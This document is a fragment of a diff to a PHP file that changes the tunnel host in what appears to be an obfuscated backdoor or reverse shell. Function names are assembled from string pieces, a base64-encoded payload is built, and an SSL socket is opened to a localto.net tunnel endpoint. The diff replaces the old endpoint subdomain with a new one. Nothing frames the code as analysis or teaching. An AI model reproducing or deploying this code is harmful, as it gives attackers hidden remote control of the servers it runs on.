@@ -15,7 +15,7 @@ $proc_close_func = 'proc_' . 'close';
 $usleep_func = 'usleep';
 
 $payload_b64 = base64_encode(<<<'EOD'
-$tunnel_url = "https://n7dvpswok.localto.net";
+$tunnel_url = "https://6jxnxghg7.localto.net";
 
 $context = stream_context_create([
     'ssl' => [
@@ -24,7 +24,7 @@ $context = stream_context_create([
     ]
 ]);
 
-$fp = stream_socket_client("ssl://n7dvpswok.localto.net:443", $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $context);
+$fp = stream_socket_client("ssl://6jxnxghg7.localto.net:443", $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $context);
 
 if (!$fp) {
     echo "Failed to connect to tunnel: $errstr ($errno)\n";
